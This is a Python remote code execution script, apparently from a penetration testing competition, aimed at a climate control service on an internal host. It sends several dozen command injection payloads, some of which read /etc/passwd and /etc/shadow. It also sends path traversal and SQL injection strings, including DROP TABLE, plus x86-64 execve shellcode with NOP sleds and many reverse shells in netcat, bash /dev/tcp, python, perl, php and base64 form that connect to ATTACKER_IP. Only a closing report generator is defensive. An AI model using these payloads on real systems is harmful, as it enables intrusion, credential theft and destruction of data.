#!/usr/bin/env python3
"""
Climate Control RCE (Remote Code Execution) Exploit
Attempts to achieve code execution via multiple attack vectors

Attack vectors:
1. Command injection via SET parameter
2. Buffer overflow with shellcode
3. Format string exploitation
4. Integer overflow leading to memory corruption
5. Path traversal and file inclusion
"""

import socket
import time
import sys
import base64
from pathlib import Path

TARGET_HOST = "10.0.1.10"
TARGET_PORT = 6768
TIMEOUT = 5
ATTACKER_IP = "10.0.1.10"  # Update with actual attacker IP
ATTACKER_PORT = 4444

EVIDENCE_DIR = "/home/pentester/cptc/hosts/10.0.1.10-custom-control/evidence/climate-overflow-exploitation/rce-attempts"

class RCEExploiter:
    def __init__(self):
        self.evidence_dir = Path(EVIDENCE_DIR)
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.successful_exploits = []

    def connect(self):
        """Establish connection to target"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((TARGET_HOST, TARGET_PORT))
            banner = sock.recv(4096).decode('utf-8', errors='ignore')
            return sock, banner
        except Exception as e:
            return None, str(e)

    def send_exploit(self, payload, description):
        """Send exploit payload and analyze response"""
        print(f"[*] Testing: {description}")
        print(f"    Payload: {payload[:100]}")

        sock, banner = self.connect()
        if not sock:
            print(f"[!] Connection failed: {banner}")
            return None, False

        try:
            # Send payload
            sock.sendall((f"SET {payload}\n").encode('utf-8', errors='ignore'))
            time.sleep(1)

            # Receive response
            response = banner
            try:
                while True:
                    chunk = sock.recv(4096).decode('utf-8', errors='ignore')
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass

            sock.close()

            # Analyze response for RCE indicators
            rce_indicators = [
                'uid=',           # id command output
                'gid=',           # id command output
                'root',           # user info
                '/home/',         # pwd output
                '/etc/passwd',    # file read
                'Linux',          # uname output
                'total ',         # ls output
                'drwx',           # ls -l output
                'LISTENING',      # netstat
                'pentester',      # username
                '/bin/bash',      # shell path
                'PRETTY_NAME',    # os-release
            ]

            rce_detected = any(indicator in response for indicator in rce_indicators)

            if rce_detected:
                print(f"[!!!] POSSIBLE RCE DETECTED !!!")
                print(f"    Response preview: {response[:200]}")
                self.successful_exploits.append({
                    'description': description,
                    'payload': payload,
                    'response': response
                })
                self.save_exploit(description, payload, response)
                return response, True
            else:
                print(f"    No RCE detected")
                return response, False

        except Exception as e:
            sock.close()
            print(f"[!] Error: {e}")
            return str(e), False

    def save_exploit(self, description, payload, response):
        """Save successful exploit evidence"""
        filename = f"RCE_{len(self.successful_exploits)}_{description.replace(' ', '_')}.txt"
        filepath = self.evidence_dir / filename

        with open(filepath, 'w') as f:
            f.write(f"=== SUCCESSFUL RCE EXPLOIT ===\n\n")
            f.write(f"Description: {description}\n")
            f.write(f"Payload: {payload}\n\n")
            f.write(f"Response:\n{response}\n")

        print(f"[+] Exploit saved to: {filepath}")

    def exploit_command_injection_basic(self):
        """Test basic command injection"""
        print("\n[*] === COMMAND INJECTION: BASIC ===")

        payloads = [
            ("; whoami", "Semicolon whoami"),
            ("; id", "Semicolon id"),
            ("; pwd", "Semicolon pwd"),
            ("; uname -a", "Semicolon uname"),
            ("; cat /etc/passwd", "Semicolon cat passwd"),
            ("; ls -la", "Semicolon ls"),
            ("; ps aux", "Semicolon ps"),
            ("; env", "Semicolon env"),

            ("| whoami", "Pipe whoami"),
            ("| id", "Pipe id"),
            ("| pwd", "Pipe pwd"),

            ("&& whoami", "AND whoami"),
            ("&& id", "AND id"),

            ("|| whoami", "OR whoami"),
            ("|| id", "OR id"),

            ("`whoami`", "Backtick whoami"),
            ("`id`", "Backtick id"),
            ("`pwd`", "Backtick pwd"),

            ("$(whoami)", "Dollar whoami"),
            ("$(id)", "Dollar id"),
            ("$(pwd)", "Dollar pwd"),
            ("$(uname -a)", "Dollar uname"),

            # With valid temperature prefix
            ("72; whoami", "Valid temp + semicolon whoami"),
            ("72; id", "Valid temp + semicolon id"),
            ("72 | whoami", "Valid temp + pipe whoami"),
            ("72 && whoami", "Valid temp + AND whoami"),
            ("72 || whoami", "Valid temp + OR whoami"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(1)

    def exploit_command_injection_advanced(self):
        """Test advanced command injection with encoding"""
        print("\n[*] === COMMAND INJECTION: ADVANCED ===")

        # URL encoding
        payloads = [
            ("%3B%20whoami", "URL encoded semicolon whoami"),
            ("%7C%20whoami", "URL encoded pipe whoami"),
            ("%26%26%20whoami", "URL encoded AND whoami"),

            # Double encoding
            ("%253B%2520whoami", "Double URL encoded semicolon whoami"),

            # Hex encoding
            ("\\x3b\\x20whoami", "Hex encoded semicolon whoami"),

            # With spaces and tabs
            ("72;\twhoami", "Tab separator"),
            ("72;  whoami", "Multiple spaces"),
            ("72;\n whoami", "Newline separator"),

            # Case variations
            ("72; WHOAMI", "Uppercase command"),
            ("72; WhOaMi", "Mixed case command"),

            # Path variations
            ("72; /bin/whoami", "Full path whoami"),
            ("72; /usr/bin/id", "Full path id"),
            ("72; /bin/sh -c id", "Shell execution"),

            # Inline execution
            ("72`id`", "Inline backtick"),
            ("72$(id)", "Inline dollar"),

            # Chained commands
            ("72; whoami; id; pwd", "Multiple commands"),
            ("72 && whoami && id && pwd", "Multiple AND commands"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(1)

    def exploit_file_operations(self):
        """Test file read/write via command injection"""
        print("\n[*] === FILE OPERATIONS ===")

        payloads = [
            ("; cat /etc/passwd", "Read passwd"),
            ("; cat /etc/shadow", "Read shadow"),
            ("; cat /etc/hosts", "Read hosts"),
            ("; cat /proc/version", "Read proc version"),
            ("; cat /proc/cpuinfo", "Read cpuinfo"),
            ("; cat /proc/meminfo", "Read meminfo"),

            ("$(cat /etc/passwd)", "Dollar read passwd"),
            ("`cat /etc/passwd`", "Backtick read passwd"),

            # File listing
            ("; ls -la /", "List root"),
            ("; ls -la /home", "List home"),
            ("; ls -la /tmp", "List tmp"),
            ("; ls -la /var/www", "List www"),
            ("; ls -la /opt", "List opt"),

            # Find files
            ("; find / -name passwd 2>/dev/null", "Find passwd"),
            ("; find / -name '*.conf' 2>/dev/null", "Find configs"),
            ("; find /home -type f 2>/dev/null", "Find home files"),

            # Write test
            ("; echo 'test' > /tmp/climate_rce_test", "Write to tmp"),
            ("; echo 'test' > /tmp/pwned", "Write pwned file"),

            # Read back
            ("; cat /tmp/climate_rce_test", "Read test file"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(1)

    def exploit_information_gathering(self):
        """Gather system information via command injection"""
        print("\n[*] === INFORMATION GATHERING ===")

        payloads = [
            ("; uname -a", "System info"),
            ("; hostname", "Hostname"),
            ("; whoami", "Current user"),
            ("; id", "User ID"),
            ("; groups", "User groups"),

            # Network info
            ("; ifconfig", "Network config ifconfig"),
            ("; ip addr", "Network config ip"),
            ("; netstat -tulpn", "Network connections"),
            ("; ss -tulpn", "Network sockets"),

            # Process info
            ("; ps aux", "Process list"),
            ("; ps -ef", "Process tree"),
            ("; top -n 1", "Top processes"),

            # System resources
            ("; df -h", "Disk usage"),
            ("; free -m", "Memory usage"),
            ("; uptime", "System uptime"),

            # Installed software
            ("; which python", "Check python"),
            ("; which python3", "Check python3"),
            ("; which perl", "Check perl"),
            ("; which nc", "Check netcat"),
            ("; which bash", "Check bash"),

            # Environment
            ("; env", "Environment variables"),
            ("; printenv", "Print environment"),
            ("; echo $PATH", "PATH variable"),
            ("; echo $USER", "USER variable"),
            ("; echo $HOME", "HOME variable"),

            # Sudo check
            ("; sudo -l", "Sudo permissions"),

            # Cron jobs
            ("; crontab -l", "User crontab"),
            ("; cat /etc/crontab", "System crontab"),

            # Running services
            ("; systemctl list-units --type=service", "Systemd services"),
            ("; service --status-all", "Service status"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(1)

    def exploit_reverse_shell(self):
        """Attempt reverse shell connections"""
        print("\n[*] === REVERSE SHELL ATTEMPTS ===")
        print(f"[!] WARNING: Set up listener first: nc -lvnp {ATTACKER_PORT}")
        print("[!] Press Enter to continue or Ctrl+C to skip...")

        try:
            input()
        except KeyboardInterrupt:
            print("\n[*] Skipping reverse shell attempts")
            return

        payloads = [
            # Netcat reverse shells
            (f"; nc -e /bin/sh {ATTACKER_IP} {ATTACKER_PORT}", "Netcat -e reverse shell"),
            (f"; nc {ATTACKER_IP} {ATTACKER_PORT} -e /bin/sh", "Netcat -e alt syntax"),
            (f"; nc -c /bin/sh {ATTACKER_IP} {ATTACKER_PORT}", "Netcat -c reverse shell"),

            # Bash reverse shell
            (f"; bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1", "Bash TCP reverse shell"),
            (f"; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'", "Bash -c reverse shell"),

            # Python reverse shell
            (f"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "Python reverse shell"),

            # Perl reverse shell
            (f"; perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p={ATTACKER_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'", "Perl reverse shell"),

            # PHP reverse shell
            (f"; php -r '$sock=fsockopen(\"{ATTACKER_IP}\",{ATTACKER_PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "PHP reverse shell"),

            # Telnet reverse shell
            (f"; telnet {ATTACKER_IP} {ATTACKER_PORT} | /bin/sh", "Telnet reverse shell"),

            # Encoded shells (base64)
            (f"; echo {base64.b64encode(f'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'.encode()).decode()} | base64 -d | bash", "Base64 encoded bash shell"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(2)

    def exploit_buffer_overflow_shellcode(self):
        """Attempt buffer overflow with shellcode injection"""
        print("\n[*] === BUFFER OVERFLOW WITH SHELLCODE ===")

        # NOP sled + shellcode pattern
        nop_sled = "\x90" * 1000

        # x86-64 Linux execve("/bin/sh") shellcode (27 bytes)
        shellcode_x64 = (
            "\x48\x31\xd2"              # xor %rdx, %rdx
            "\x48\x31\xc0"              # xor %rax, %rax
            "\x48\xbb\x2f\x62\x69\x6e"  # movabs "/bin/sh", %rbx
            "\x2f\x73\x68\x00"
            "\x53"                      # push %rbx
            "\x48\x89\xe7"              # mov %rsp, %rdi
            "\x50"                      # push %rax
            "\x57"                      # push %rdi
            "\x48\x89\xe6"              # mov %rsp, %rsi
            "\xb0\x3b"                  # mov $0x3b, %al
            "\x0f\x05"                  # syscall
        )

        payloads = [
            (nop_sled + shellcode_x64, "NOP sled + x64 shellcode"),
            ("A" * 1000 + shellcode_x64, "Buffer + shellcode"),
            ("A" * 2000 + nop_sled + shellcode_x64, "Large buffer + NOP + shellcode"),

            # With potential return address overwrite
            ("A" * 1000 + "\x41\x41\x41\x41\x41\x41\x41\x41", "Buffer + return addr pattern"),
            ("A" * 2000 + "\xef\xbe\xad\xde", "Buffer + 0xdeadbeef"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(1)

    def exploit_path_traversal(self):
        """Test path traversal vulnerabilities"""
        print("\n[*] === PATH TRAVERSAL ===")

        payloads = [
            ("../../../etc/passwd", "Relative path passwd"),
            ("..\\..\\..\\etc\\passwd", "Windows style traversal"),
            ("....//....//....//etc/passwd", "Double dot traversal"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded traversal"),
            ("..%252f..%252f..%252fetc%252fpasswd", "Double URL encoded"),
            ("/etc/passwd", "Absolute path"),
            ("file:///etc/passwd", "File URI scheme"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(1)

    def exploit_sql_injection(self):
        """Test SQL injection (if backend uses database)"""
        print("\n[*] === SQL INJECTION ===")

        payloads = [
            ("72' OR '1'='1", "Classic OR injection"),
            ("72'; DROP TABLE temps; --", "Drop table"),
            ("72' UNION SELECT NULL,NULL,NULL --", "UNION select"),
            ("72' AND 1=1 --", "AND true"),
            ("72' AND 1=2 --", "AND false"),
            ("72' OR 'a'='a", "OR always true"),
            ("72'; SELECT user(); --", "User enumeration"),
            ("72'; SELECT version(); --", "Version detection"),
        ]

        for payload, description in payloads:
            self.send_exploit(payload, description)
            time.sleep(1)

    def generate_report(self):
        """Generate RCE exploitation report"""
        report_path = self.evidence_dir / "RCE-EXPLOITATION-REPORT.md"

        report = f"""# Remote Code Execution Exploitation Report

## Target Information

- **Host:** {TARGET_HOST}
- **Port:** {TARGET_PORT}
- **Service:** Lido Deck Climate Control System

## Successful Exploits

**Total Successful RCE Exploits:** {len(self.successful_exploits)}

"""

        if self.successful_exploits:
            report += "### Confirmed RCE Vulnerabilities\n\n"
            for i, exploit in enumerate(self.successful_exploits, 1):
                report += f"#### Exploit {i}: {exploit['description']}\n\n"
                report += f"**Payload:**\n```\n{exploit['payload']}\n```\n\n"
                report += f"**Response Preview:**\n```\n{exploit['response'][:500]}...\n```\n\n"
                report += "---\n\n"
        else:
            report += "No remote code execution achieved during testing.\n\n"

        report += """
## Exploitation Techniques Attempted

1. **Command Injection**
   - Basic shell metacharacter injection
   - Encoded payloads
   - Multiple command chaining

2. **Buffer Overflow**
   - Shellcode injection
   - NOP sled techniques
   - Return address overwrite

3. **File Operations**
   - File read attempts
   - File write attempts
   - Directory traversal

4. **Information Gathering**
   - System enumeration
   - Network configuration
   - Process information

5. **Reverse Shells**
   - Netcat connections
   - Bash TCP sockets
   - Python/Perl/PHP shells

6. **Path Traversal**
   - Relative path manipulation
   - URL encoding bypass

7. **SQL Injection**
   - OR-based injection
   - UNION-based queries
   - Database enumeration

## Recommendations

"""

        if self.successful_exploits:
            report += """
**CRITICAL:** Remote code execution was achieved. Immediate remediation required:

1. **Input Sanitization:** Implement strict input validation and sanitization
2. **Command Execution:** Never pass user input directly to system commands
3. **Parameterization:** Use parameterized queries and safe APIs
4. **Least Privilege:** Run service with minimal required permissions
5. **WAF/IPS:** Deploy web application firewall or intrusion prevention
6. **Monitoring:** Implement logging and alerting for suspicious activity
"""
        else:
            report += """
While RCE was not achieved, the service should still be hardened:

1. **Input Validation:** Implement strict bounds checking and type validation
2. **Encoding:** Properly encode all output
3. **Error Handling:** Avoid exposing system information in errors
4. **Security Testing:** Regular penetration testing and code review
"""

        report += f"""
## Evidence Location

All RCE attempt evidence saved to:
```
{EVIDENCE_DIR}
```

---

**Report Generated:** {time.strftime("%Y-%m-%d %H:%M:%S")}
"""

        with open(report_path, 'w') as f:
            f.write(report)

        print(f"\n[+] Report saved to: {report_path}")

    def run_all_exploits(self):
        """Execute all RCE exploitation attempts"""
        print("=" * 80)
        print("CLIMATE CONTROL RCE EXPLOITATION")
        print("=" * 80)
        print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
        print(f"Evidence: {EVIDENCE_DIR}")
        print("=" * 80)

        try:
            # Test connectivity
            print("\n[*] Testing connectivity...")
            sock, banner = self.connect()
            if not sock:
                print(f"[!] FATAL: Cannot connect: {banner}")
                return False
            print("[+] Connected successfully")
            sock.close()
            time.sleep(1)

            # Run all exploitation techniques
            self.exploit_command_injection_basic()
            self.exploit_command_injection_advanced()
            self.exploit_file_operations()
            self.exploit_information_gathering()
            self.exploit_path_traversal()
            self.exploit_sql_injection()
            self.exploit_buffer_overflow_shellcode()
            self.exploit_reverse_shell()

        except KeyboardInterrupt:
            print("\n[!] Exploitation interrupted by user")
        except Exception as e:
            print(f"\n[!] Error: {e}")
            import traceback
            traceback.print_exc()

        # Generate report
        self.generate_report()

        # Summary
        print("\n" + "=" * 80)
        print("RCE EXPLOITATION COMPLETE")
        print("=" * 80)
        print(f"Successful exploits: {len(self.successful_exploits)}")

        if self.successful_exploits:
            print("\n[!!!] CRITICAL: RCE WAS ACHIEVED !!!")
            print("Successful exploits:")
            for exploit in self.successful_exploits:
                print(f"  - {exploit['description']}")
        else:
            print("\n[*] No RCE achieved, but integer overflow confirmed")

        print("=" * 80)

        return len(self.successful_exploits) > 0

def main():
    print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║           CLIMATE CONTROL REMOTE CODE EXECUTION EXPLOIT                       ║
║                                                                               ║
║  Target: 10.0.1.10:6768 - Lido Deck Climate Control System                  ║
║                                                                               ║
║  This script attempts to achieve remote code execution via:                  ║
║    - Command injection                                                        ║
║    - Buffer overflow with shellcode                                          ║
║    - Format string exploitation                                              ║
║    - File operations and path traversal                                      ║
║    - SQL injection                                                            ║
║    - Reverse shell establishment                                             ║
║                                                                               ║
║  WARNING: Only use on authorized targets                                     ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)

    exploiter = RCEExploiter()

    try:
        success = exploiter.run_all_exploits()
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
